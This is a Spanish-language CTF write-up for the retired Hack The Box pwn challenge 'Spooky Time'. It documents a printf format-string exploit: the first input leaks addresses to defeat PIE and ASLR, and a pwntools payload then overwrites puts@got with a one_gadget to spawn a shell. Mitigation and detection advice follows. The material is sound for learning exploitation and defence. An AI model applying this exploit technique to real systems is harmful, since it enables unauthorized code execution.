---
challenge: Spooky Time
type: Pwn
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [pwn, format-string, got-overwrite, pie, aslr, pwntools]
---

# Spooky Time — Hack The Box (Challenge)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto documentado; sin flags reales.
> Los offsets de libc dependen del build entregado; se usan placeholders.

## TL;DR

Un binario de 64 bits con PIE, canario y NX usa `printf` con dos cadenas controladas por el usuario. La primera fuga permite saltarse PIE y ASLR; la segunda es una escritura arbitraria con `%n`. El offset de pila controlado es 8. Se sobrescribe `puts@got` con un `one_gadget` de la libc entregada y se obtiene shell.

## Enunciado y superficie

- Pwn, Medium, retirado.
- Se entrega `spooky_time`, la libc del reto y un servicio remoto.
- El binario pide dos frases y las pasa a `printf` como formato.

```bash
file spooky_time
checksec --file=spooky_time
```

```text
Arch: amd64-64-little
RELRO: Partial/No RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
RUNPATH: ./glibc/
```

## Reconocimiento

```bash
./spooky_time
# pide una frase
AAAA %p %p %p
```

La salida repite valores de la pila. Se prueba `%8$lx` con `AAAABBBB` y se ve `4242424241414141`: el offset 8 contiene la entrada. Ese es el punto de control para `%n`.

## Análisis del código

`main` llama dos veces a `printf` con el buffer del usuario:

```c
printf(user_input);   // primera frase
printf(user_input2);  // segunda frase
```

No hay `printf("%s", user_input)`. La primera llamada sirve para filtrar; la segunda, para escribir. El canario no se toca porque no hay desbordamiento de pila: el fallo es de formato.

## Explicación del fallo

`%n` escribe en la dirección apuntada por el argumento correspondiente el número de bytes impresos hasta ese punto. Si el buffer está en la pila y se controla el offset 8, se puede colocar una dirección y usar `%hn` para escribir dos bytes. `pwntools` automatiza el reparto:

```python
payload = fmtstr_payload(8, {elf.got.puts: glibc.address + one_gadget})
```

La primera fuga necesita dos direcciones: una del binario (para PIE) y otra de libc (para ASLR). En el build de referencia, `%51$p` y `%69$p` devuelven esos valores; se restan los símbolos correspondientes para calcular las bases.

## Reproducción local

```bash
python3 -m venv .venv
. .venv/bin/activate
pip install pwntools
one_gadget glibc/libc.so.6
```

Se desactiva ASLR para la primera prueba (`echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`) y se vuelve a activar después. El binario busca la libc en `./glibc/` por `RUNPATH`; hay que ejecutarlo desde ese directorio.

## Explotación

Esqueleto del script:

```python
from pwn import *
context.binary = elf = ELF('./spooky_time')
libc = ELF('./glibc/libc.so.6')

p = process()
p.sendlineafter(b'something scary!', b'%51$p.%69$p')
p.recvuntil(b'better than\n')
leaks = p.recvline().strip().split(b'.')
elf.address = int(leaks[0], 16) - elf.sym['main']
libc.address = int(leaks[1], 16) - 128 - libc.sym['__libc_start_main']

one_gadget = libc.address + <ONE_GADGET_OFFSET>
payload = fmtstr_payload(8, {elf.got.puts: one_gadget})
p.sendlineafter(b'one more time..', payload)
p.interactive()
```

El `puts` de la siguiente llamada salta al `one_gadget`. Si las restricciones del gadget no se cumplen, se prueban los otros offsets que imprime `one_gadget`. En remoto, se usa la libc exacta del reto; no la del sistema.

## Evidencia

- `checksec` y salida de `%8$lx`.
- Cálculo de las bases de PIE y libc.
- Shell obtenida y `id`, sin flag.

## Lecciones aprendidas

- `printf(user_input)` es una primitiva de lectura y escritura, no solo un leak.
- El offset 8 es el punto donde el buffer de la pila aparece como argumento.
- PIE y ASLR se bypassan con dos fugas, no con una.
- La libc del reto manda: los offsets del sistema no sirven.

## Mitigaciones y detección

- Usar `printf("%s", input)` o `fputs`; nunca pasar entrada a una función de formato.
- Compilar con `-Wformat-security` y `-D_FORTIFY_SOURCE=2`.
- RELRO completo y `-z now` dificultan la escritura en GOT.
- Detección: cadenas con `%n`/`%hn` en entradas de red y crashes anómalos de procesos que imprimen datos de usuario.

## Referencias

- <https://7rocky.github.io/en/ctf/htb-challenges/pwn/spooky-time/>
- <https://docs.pwntools.com/en/stable/fmtstr.html>
- <https://github.com/david942j/one_gadget>
